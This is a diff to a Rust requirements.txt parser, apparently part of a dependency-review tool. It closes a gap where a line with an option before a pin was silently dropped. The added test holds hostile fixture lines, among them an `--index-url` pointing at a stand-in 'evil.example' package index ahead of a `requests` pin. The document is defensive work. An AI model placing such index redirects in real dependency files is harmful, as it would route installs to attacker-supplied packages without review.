@@ -412,12 +412,33 @@ pub fn parse_requirements_txt_packages(
             // the first redirecting option is kept, because that one is part of
             // the pin. A `--hash` after it is lost, which makes the line fail
             // its hash check rather than pass unreviewed.
-            if let Some(cut) = code_part
+            match code_part
                 .split_whitespace()
                 .position(|tok| tok.starts_with('-') && !is_hash_option(tok))
             {
-                let kept: Vec<&str> = code_part.split_whitespace().take(cut).collect();
-                code_part = kept.join(" ");
+                Some(0) if code_part.contains("==") => {
+                    // The option comes first AND the line also pins something,
+                    // so truncation would leave nothing and the line would be
+                    // dropped -- losing the pin silently, which is the
+                    // fail-open this path exists to close. pip accepts
+                    // `--index-url URL requests==2.31.0` on one line, so this is
+                    // not hypothetical, and the redirect would never be
+                    // reviewed or disclosed. Refused instead: the opt-in
+                    // tolerates an option alongside a requirement, not a
+                    // requirement the parser cannot reach.
+                    return Err(LockfileError::InvalidData(format!(
+                        "line {line_num}: a requirements option precedes the pinned requirement on \
+                         the same line, so the pin cannot be reviewed alongside it: `{code_part}`"
+                    )));
+                }
+                // An option alone on its line is the ordinary pip layout, and
+                // the requirement it belongs to is on another line.
+                Some(0) => continue,
+                Some(cut) => {
+                    let kept: Vec<&str> = code_part.split_whitespace().take(cut).collect();
+                    code_part = kept.join(" ");
+                }
+                None => {}
             }
         }
 
@@ -1266,6 +1287,41 @@ urllib3==2.1.0 # trailing comment
                 "the pinned version must survive the opt-in: {opted_in:?}"
             );
         }
+    }
+
+    /// An option *before* the pin on the same line. Truncating at the option
+    /// leaves nothing, and skipping the line loses the pin -- so
+    /// `--index-url https://evil requests==2.31.0` against a base of
+    /// `requests==2.28.0` put no entry for `requests` in the head graph. CI
+    /// only walks `added` and `upgraded`, so the upgrade was never evaluated
+    /// and the redirect never disclosed. An option alone on its line is the
+    /// ordinary pip layout and stays allowed.
+    #[test]
+    fn an_option_before_the_pin_on_one_line_is_refused_not_skipped() {
+        for file in [
+            "--index-url https://evil.example/simple requests==2.31.0\n",
+            "-r other-requirements.txt requests==2.31.0\n",
+            "--pre requests==2.31.0\n",
+        ] {
+            let err = parse_requirements_txt_packages(file, true)
+                .unwrap_err()
+                .to_string();
+            assert!(
+                err.contains("precedes the pinned requirement"),
+                "an option-led line carrying a pin must be refused, got: {err}"
+            );
+        }
+
+        // The ordinary layout still works: the option is on its own line.
+        let ok = parse_requirements_txt_packages(
+            "--index-url https://mirror.example/simple\nrequests==2.31.0\n",
+            true,
+        )
+        .unwrap();
+        assert!(
+            ok.values().any(|e| e.version == "2.31.0"),
+            "an option on its own line must not cost the pin: {ok:?}"
+        );
     }
 
     /// The option scan looks at every token, so a flag that follows a spec
